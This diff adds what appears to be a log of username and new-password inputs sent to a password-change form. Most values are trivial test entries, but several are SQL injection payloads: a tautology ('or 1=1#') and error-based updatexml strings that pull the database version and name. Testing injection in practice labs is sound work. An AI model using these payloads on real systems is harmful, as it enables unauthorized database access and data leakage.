@@ -1,0 +1,102 @@
+User Name:1
+New Password:0
+User Name:1
+New Password:0'
+User Name:1
+New Password:0' or 1=1#
+User Name:1
+New Password:0"
+User Name:1
+New Password:0
+User Name:'admin'
+New Password:0
+User Name:''
+New Password:0
+User Name:''
+New Password:0
+User Name:''
+New Password:0
+User Name:''
+New Password:0
+User Name:''
+New Password:0
+User Name:''
+New Password:0
+User Name:''
+New Password:0
+User Name:''
+New Password:0
+User Name:''
+New Password:1
+User Name:''
+New Password:1
+User Name:''
+New Password:1
+User Name:''
+New Password:1
+User Name:''
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1' or select updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' or select updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' or select updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' or select updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' or select updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:
+New Password:1
+User Name:
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1
+User Name:'admin'
+New Password:1' or select updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' or select updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' select updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' or updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' or updatexml(1,concat(0x7e,(version())),0)#
+User Name:'admin'
+New Password:1' or updatexml(1,concat(0x7e,(database())),0)#
